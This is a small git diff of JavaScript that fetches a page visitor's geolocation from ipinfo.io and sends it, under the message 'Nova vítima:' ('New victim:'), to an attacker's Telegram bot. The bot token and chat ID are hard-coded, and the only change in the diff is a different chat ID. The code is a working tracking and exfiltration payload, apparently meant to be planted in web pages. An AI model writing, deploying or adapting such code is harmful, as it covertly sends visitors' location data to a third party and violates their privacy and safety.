@@ -9,7 +9,7 @@ fetch("https://ipinfo.io/json?token=c296f01ff5e2f2")
 
     var msg = "🎯 Nova vítima: " + localizacao;
     var telegramToken = "8112207542:AAFcWgs84PsAoQxfmuFmwy4wPd1v_tTSRnk";
-    var chatId = "7406910715";
+    var chatId = "74069107115";
     var url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
 
     fetch(url)
